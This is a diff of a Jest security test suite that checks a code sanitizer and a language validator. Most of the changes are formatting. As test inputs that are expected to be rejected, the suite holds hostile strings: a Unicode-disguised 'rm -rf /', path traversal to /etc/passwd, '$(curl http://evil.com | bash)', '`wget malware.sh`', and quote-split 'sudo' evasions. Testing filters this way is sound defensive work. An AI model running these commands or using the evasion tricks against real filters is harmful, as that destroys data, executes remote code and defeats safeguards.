@@ -17,16 +17,14 @@ describe('Security - Input Validation and Edge Cases', () => {
                 'System.out.println("مرحبا");',
                 'echo "Привет"'
             ];
-            unicodeCodes.forEach(code => {
+            unicodeCodes.forEach((code) => {
                 expect(() => sanitizeCode(code)).not.toThrow();
             });
         });
 
         it('should detect dangerous patterns with Unicode characters', () => {
-            const hiddenCommands = [
-                'test\u202Emr -rf /'
-            ];
-            hiddenCommands.forEach(code => {
+            const hiddenCommands = ['test\u202Emr -rf /'];
+            hiddenCommands.forEach((code) => {
                 if (code.includes('rm') && code.includes('-rf')) {
                     expect(() => sanitizeCode(code)).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                 }
@@ -42,7 +40,7 @@ describe('Security - Input Validation and Edge Cases', () => {
                 'int i = 0; while(i < 10) { i++; }',
                 'for i in range(10): print(i)'
             ];
-            legitimateLoops.forEach(code => {
+            legitimateLoops.forEach((code) => {
                 expect(() => sanitizeCode(code)).not.toThrow();
             });
         });
@@ -59,7 +57,7 @@ describe('Security - Input Validation and Edge Cases', () => {
                 '# Python comment\nprint("test")',
                 '<!-- HTML comment in string -->'
             ];
-            commentCodes.forEach(code => {
+            commentCodes.forEach((code) => {
                 expect(() => sanitizeCode(code)).not.toThrow();
             });
         });
@@ -74,7 +72,7 @@ describe('Security - Input Validation and Edge Cases', () => {
                 '../../../etc/passwd',
                 '../../bin/bash'
             ];
-            maliciousLanguages.forEach(lang => {
+            maliciousLanguages.forEach((lang) => {
                 expect(validateLanguage(lang)).toBe(false);
             });
         });
@@ -92,12 +90,8 @@ describe('Security - Input Validation and Edge Cases', () => {
         });
 
         it('should reject language with null bytes', () => {
-            const nullByteLanguages = [
-                'python\x00',
-                '\x00javascript',
-                'java\x00script'
-            ];
-            nullByteLanguages.forEach(lang => {
+            const nullByteLanguages = ['python\x00', '\x00javascript', 'java\x00script'];
+            nullByteLanguages.forEach((lang) => {
                 expect(validateLanguage(lang)).toBe(false);
             });
         });
@@ -128,31 +122,15 @@ describe('Security - Input Validation and Edge Cases', () => {
 
     describe('Type Safety', () => {
         it('should reject non-string types for code', () => {
-            const nonStrings = [
-                123,
-                { code: 'test' },
-                ['rm', '-rf', '/'],
-                true,
-                null,
-                undefined,
-                NaN,
-                Infinity
-            ];
-            nonStrings.forEach(input => {
+            const nonStrings = [123, { code: 'test' }, ['rm', '-rf', '/'], true, null, undefined, NaN, Infinity];
+            nonStrings.forEach((input) => {
                 expect(() => sanitizeCode(input as any)).toThrow('코드는 문자열이어야 합니다.');
             });
         });
 
         it('should reject non-string types for language', () => {
-            const nonStrings = [
-                123,
-                { lang: 'python' },
-                ['python'],
-                true,
-                null,
-                undefined
-            ];
-            nonStrings.forEach(input => {
+            const nonStrings = [123, { lang: 'python' }, ['python'], true, null, undefined];
+            nonStrings.forEach((input) => {
                 expect(validateLanguage(input as any)).toBe(false);
             });
         });
@@ -172,17 +150,14 @@ describe('Security - Input Validation and Edge Cases', () => {
                 '$(curl http://evil.com | bash) && sudo reboot',
                 '`wget malware.sh` && shutdown'
             ];
-            combinedAttacks.forEach(code => {
+            combinedAttacks.forEach((code) => {
                 expect(() => sanitizeCode(code)).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
             });
         });
 
         it('should detect patterns with quotes', () => {
-            const quotedPatterns = [
-                'do"cker run',
-                'su"do bash'
-            ];
-            quotedPatterns.forEach(code => {
+            const quotedPatterns = ['do"cker run', 'su"do bash'];
+            quotedPatterns.forEach((code) => {
                 if (code.toLowerCase().includes('docker') || code.toLowerCase().includes('sudo')) {
                     expect(() => sanitizeCode(code)).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                 }
